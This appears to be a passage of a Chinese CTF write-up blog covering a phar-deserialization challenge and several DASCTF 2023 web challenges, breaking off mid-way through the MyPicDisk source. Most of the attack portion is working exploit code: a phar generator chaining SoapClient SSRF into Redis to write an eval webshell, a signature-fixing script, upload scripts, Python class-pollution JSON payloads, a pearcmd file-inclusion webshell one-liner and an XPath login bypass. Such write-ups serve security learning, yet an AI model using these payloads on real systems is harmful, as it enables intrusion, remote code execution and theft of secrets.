<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">checkname</span>(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkname</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmpname</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>, <span class="string">&quot;/var/www/html/check.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload ok&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;check.jpg&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph|\\\x|&lt;\?/i&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;check.jpg&#x27;</span>))) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">getimagesize</span>(<span class="string">&#x27;check.jpg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>分析一下:</p>
<ul>
<li>testupload类有个<code>__destruct</code>魔术方法可以调用一个checkname()方法,这里是phar序列化漏洞利用点</li>
<li>check类就有一个检测后缀的函数(允许jpg和png后缀)</li>
<li>然后是一个文件上传点我们可以上传任意文件,会被保存到/var/www/html/check.jpg</li>
<li>然后检测是否存在check.jpg文件,然后做了一个正则匹配不能出现<code>ph,\x,&lt;?</code>这样的情况</li>
<li>然后检测check.jpg的文件头字节是否属于图片不是就删掉</li>
<li>最后就是我们可以传参控制phar文件路径,这里的file_exists()函数就是受影响的函数,当检查的文件是phar文件时会自动反序列化meta-data数据</li>
</ul>
<p>我们访问robots.txt可以发现:<br>redis.conf里可以找到redis的密码:574c941c5987232d337276764d3413c4<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231210235913.png" alt="image.png"></p>
<p>htaccess.txt可以发现:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .wupco</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><br>他可以把wupco后缀当成php文件解析</p>
<p>思路:<br>phar反序列化,test_upload的check成员设置为SoapClient对象,当调用<code>if (!$this-&gt;check-&gt;checkname($this-&gt;filename)) &#123;</code>时,调用不存在方法会调用SoapClient的<code>__invoke</code>方法发送ssrf去打redis写webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc0</span>=<span class="string">&quot;AUTH 574c941c5987232d337276764d3413c4&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;CONFIG SET dir /var/www/html/&quot;</span>;</span><br><span class="line"><span class="variable">$poc1</span>=<span class="string">&quot;SET x &#x27;&lt;?=eval(\$_POST[1]);?&gt;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$poc2</span>=<span class="string">&quot;CONFIG SET dbfilename shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$poc3</span>=<span class="string">&quot;SAVE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc0</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc1</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc2</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc3</span>.<span class="string">&#x27;^^hello&#x27;</span>;</span><br><span class="line"><span class="variable">$uri</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$uri</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="variable">$uri</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$check</span>, <span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test_upload</span>(<span class="variable">$b</span>, <span class="string">&#x27;exp.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span> . <span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); <span class="comment">// add GIF Header</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$exp</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件 //签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;exp.phar&quot;</span>, <span class="string">&quot;exp.jpg&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>由于题目用正则匹配了文件内容，所以直接上传上面的包是不行的，check.jpg会被删掉，所以我们需要对exp.jpg做处理：</p>
<ul>
<li>利用序列化字符串16进制绕过，将s改成S</li>
<li>把?做16进制编码加个反斜杠，即\3f</li>
<li>由于还会匹配ph字样，所以把h也做16进制编码，编码成\68<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231211002239.png" alt="image.png"></li>
</ul>
<p>此时需要重新计算签名:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./exp.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:  </span><br><span class="line">    f = file.read()  </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据  </span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识  </span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)with open(&#x27;./jmx.jpg&#x27;, &#x27;wb&#x27;) as file:  </span></span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure></p>
<p>exp:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:12345/&#x27;</span>  </span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&quot;jmx.jpg&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;  </span><br><span class="line">req=requests.post(url=url,files=files)  </span><br><span class="line">requests.get(url=url+<span class="string">&quot;?img_file=phar:///var/www/html/check.jpg/test.txt&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231211003329.png" alt="image.png"><br>这个镜像设置了curl的suid权限<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;curl file:///flag&#x27;);</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF 2023 &amp; 0X401七月暑期挑战赛</title>
    <url>/2024/02/06/DASCTF2023/</url>
    <content><![CDATA[<h3 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">Users = []</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>
<p>因为没学过python原型链污染,比赛时一直用各种payload加绕过init注册登录成功但是不知道要改<code>__file__</code>,没拿到flag,赛后好好学习了一下python原型链污染<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__, &quot;r&quot;).read()</span><br></pre></td></tr></table></figure><br>/路由可以读取文件内容,注册和登录界面没什么作用就是给你污染的,直接污染<code>__file__</code>的值,<code>__init__</code>被过滤了用Unicode编码绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;__file__&quot;:&quot;../../../proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br>这里的/proc/1/environ是读环境变量,这个文件至关重要,==它的内容是正在运行的进程的环境变量列表==</p>
<p>刷新/路由就能看到结果</p>
<p>还有一个大佬直接污染的_static_folder为/进行目录穿越<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__init\u005f_&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;app&quot;:&#123;&quot;_static_folder&quot;:&quot;/&quot;&#125;&#125;&#125;,  </span><br><span class="line">&quot;username&quot;:1,  </span><br><span class="line">&quot;password&quot;:1  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>然后直接访问:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/static/proc/1/environ</span><br></pre></td></tr></table></figure><br>得到flag</p>
<h3 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h3><p>页面底部有指纹信息2015 SEACMS V1.0,网上搜一下相关的漏洞<br>admin弱口令登录到后台页面(密码123456),可以利用文件包含pearcmd<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?r=../../../../../../../../../../usr/share/php/pearcmd&amp;+config-create+/&lt;?=eval($_POST[1])?&gt;+../../../../../../../../tmp/1.php</span><br></pre></td></tr></table></figure></p>
<p>蚁剑:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://77339ca5-0e53-4f9d-9b54-5c953f4f3cfb.node4.buuoj.cn/admin/?r=../../../../../../../../tmp/1</span><br><span class="line"></span><br><span class="line">这里因为这个cms的文件包含漏洞后面会拼接php后缀就不用加了</span><br><span class="line"></span><br><span class="line">密码:1</span><br></pre></td></tr></table></figure><br>根目录发现/flag_you_find_ya<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;13e7068b-a748-4240-98cc-655cd53c6b4b&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h3><p>首先是一个登录界面,万能密码就能登<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; or 1 or &#x27;1&amp;password=a</span><br></pre></td></tr></table></figure><br>访问/y0u_cant_find_1t.zip得到源码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span 